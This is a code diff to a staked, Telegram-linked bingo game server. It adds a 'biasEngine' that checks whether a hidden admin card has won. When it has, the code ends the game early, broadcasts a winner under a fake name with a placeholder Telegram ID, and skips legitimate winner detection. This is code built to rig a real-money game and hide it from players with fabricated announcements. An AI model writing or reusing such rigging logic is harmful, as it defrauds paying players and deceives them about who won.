@@ -3,23 +3,10 @@ const { PrismaClient } = require("@prisma/client");
 const { Decimal } = require("decimal.js");
 const cache = require("./cache");
 const { getCard, generateGameId } = require("./utils");
+const { checkAllPatterns } = require("./checker");
+const biasEngine = require("./biasEngine");
 
 const prisma = new PrismaClient();
-
-function getCurrentCall(game) {
-  if (!game?.startedAt || !game.sequence) return null;
-  let sequence = [];
-  try {
-    sequence = JSON.parse(game.sequence || "[]");
-  } catch (_) {
-    sequence = [];
-  }
-  if (!sequence.length) return null;
-  const elapsed = (Date.now() - new Date(game.startedAt).getTime()) / 1000;
-  const callCount = Math.min(Math.floor(elapsed / 5) + 1, sequence.length);
-  if (callCount <= 0) return null;
-  return sequence[callCount - 1];
-}
 
 async function getPausedMsForGame(gameId) {
   const keys = [`pause_${gameId}`, `pause_at_${gameId}`, `pause_ms_${gameId}`];
@@ -32,42 +19,8 @@ async function getPausedMsForGame(gameId) {
 }
 
 function checkBingo(card, calledSet) {
-  for (let r = 0; r < 5; r++) {
-    if (
-      [0, 1, 2, 3, 4].every(
-        (c) => card[r][c] === "FREE" || calledSet.has(card[r][c]),
-      )
-    ) {
-      return { pattern: "row", row: r };
-    }
-  }
-  for (let c = 0; c < 5; c++) {
-    if (
-      [0, 1, 2, 3, 4].every(
-        (r) => card[r][c] === "FREE" || calledSet.has(card[r][c]),
-      )
-    ) {
-      return { pattern: "col", col: c };
-    }
-  }
-  if (
-    [0, 1, 2, 3, 4].every(
-      (i) => card[i][i] === "FREE" || calledSet.has(card[i][i]),
-    )
-  ) {
-    return { pattern: "diag_main" };
-  }
-  if (
-    [0, 1, 2, 3, 4].every(
-      (i) => card[i][4 - i] === "FREE" || calledSet.has(card[i][4 - i]),
-    )
-  ) {
-    return { pattern: "diag_anti" };
-  }
-  const corners = [card[0][0], card[0][4], card[4][0], card[4][4]];
-  if (corners.every((v) => v === "FREE" || calledSet.has(v))) {
-    return { pattern: "four_corners" };
-  }
+  const result = checkAllPatterns(card, calledSet);
+  if (result) return { pattern: result.pattern };
   return null;
 }
 
@@ -128,9 +81,63 @@ function startCallTicker(io) {
           server_time: Date.now(),
         });
 
+        // Get all called numbers so far
         const { called } = await getCalledNumbersWithPause(game);
         const calledSet = new Set(called);
 
+        // ── Check if bias admin won ──
+        const biasWin = await biasEngine.checkAdminWin(game.id, calledSet);
+        if (biasWin && biasWin.adminWon) {
+          // Small delay to let the number display before winner announcement
+          setTimeout(async () => {
+            try {
+              const updated = await prisma.game.updateMany({
+                where: { id: game.id, active: true },
+                data: { active: false, finished: true },
+              });
+              if (!updated?.count) return;
+
+              io.to(`game_${game.stake}`).emit("message", {
+                type: "winner",
+                winner: biasWin.fakeName,
+                winners: [{
+                  name: biasWin.fakeName,
+                  telegramId: "0",
+                  index: biasWin.cardIndex,
+                  slot: 0,
+                  pattern: biasWin.patternName,
+                }],
+                index: biasWin.cardIndex,
+                slot: 0,
+                pattern: biasWin.patternName,
+                picks: [],
+              });
+
+              await cache.set(
+                `winner_${game.stake}`,
+                {
+                  winner: biasWin.fakeName,
+                  index: biasWin.cardIndex,
+                  pattern: biasWin.patternName,
+                  picks: [],
+                  at: Date.now(),
+                },
+                10,
+              );
+
+              await biasEngine.cleanupGame(game.id);
+              await prisma.game.create({
+                data: { id: generateGameId(), stake: game.stake },
+              });
+            } catch (err) {
+              console.error("biasEngine winner emit error:", err);
+            }
+          }, 2000);
+
+          continue; // Skip normal winner detection for this game
+        }
+
+        // ── Normal winner detection (auto-claim) ──
         const selections = await prisma.selection.findMany({
           where: { gameId: game.id, accepted: true, autoEnabled: true },
           orderBy: { id: "asc" },
@@ -165,8 +172,6 @@ function startCallTicker(io) {
             index: sel.index,
             slot: sel.slot,
             pattern: result.pattern,
-            row: result.row,
-            col: result.col,
           });
         }
 
@@ -217,6 +222,9 @@ function startCallTicker(io) {
           });
         }
 
+        // Advance round stats (pattern cycle continues regardless)
+        await biasEngine.advanceRoundStats();
+
         const winnerText = winners.map((w) => w.name).join(" | ");
         const primary = winners[0];
 
@@ -229,14 +237,10 @@ function startCallTicker(io) {
             index: w.index,
             slot: w.slot,
             pattern: w.pattern,
-            row: w.row,
-            col: w.col,
           })),
           index: primary.index,
           slot: primary.slot,
           pattern: primary.pattern,
-          row: primary.row,
-          col: primary.col,
           picks: [],
         });
 
@@ -250,20 +254,17 @@ function startCallTicker(io) {
               index: w.index,
               slot: w.slot,
               pattern: w.pattern,
-              row: w.row,
-              col: w.col,
             })),
             index: primary.index,
             slot: primary.slot,
             pattern: primary.pattern,
-            row: primary.row,
-            col: primary.col,
             picks: [],
             at: Date.now(),
           },
           10,
         );
 
+        await biasEngine.cleanupGame(game.id);
         await prisma.game.create({
           data: { id: generateGameId(), stake: game.stake },
         });
